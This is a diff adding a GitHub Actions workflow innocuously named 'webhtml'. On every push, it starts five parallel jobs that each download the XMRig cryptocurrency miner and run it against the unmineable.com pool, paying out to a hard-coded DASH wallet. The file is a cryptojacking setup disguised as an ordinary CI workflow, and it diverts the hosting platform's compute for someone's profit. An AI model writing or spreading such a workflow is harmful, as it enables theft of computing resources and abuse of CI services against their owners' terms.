@@ -1,0 +1,71 @@
+name: webhtml
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  start_task_1:
+    name: Start Task 1
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 1
+        run: |  
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DASH:XiMTytXXDFPRdurfaz8shSu2Pxwwcq3mzD.DiasWorker -p x --tls --threads=4
+
+  start_task_2:
+    name: Start Task 2
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 2
+        run: |  
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DASH:XiMTytXXDFPRdurfaz8shSu2Pxwwcq3mzD.DiasWorker -p x --tls --threads=4
+
+  start_task_3:
+    name: Start Task 3
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 3
+        run: |  
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DASH:XiMTytXXDFPRdurfaz8shSu2Pxwwcq3mzD.DiasWorker -p x --tls --threads=4
+
+  start_task_4:
+    name: Start Task 4
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 4
+        run: |  
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DASH:XiMTytXXDFPRdurfaz8shSu2Pxwwcq3mzD.DiasWorker -p x --tls --threads=4
+
+  start_task_5:
+    name: Start Task 5
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 5
+        run: |  
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DASH:XiMTytXXDFPRdurfaz8shSu2Pxwwcq3mzD.DiasWorker -p x --tls --threads=4
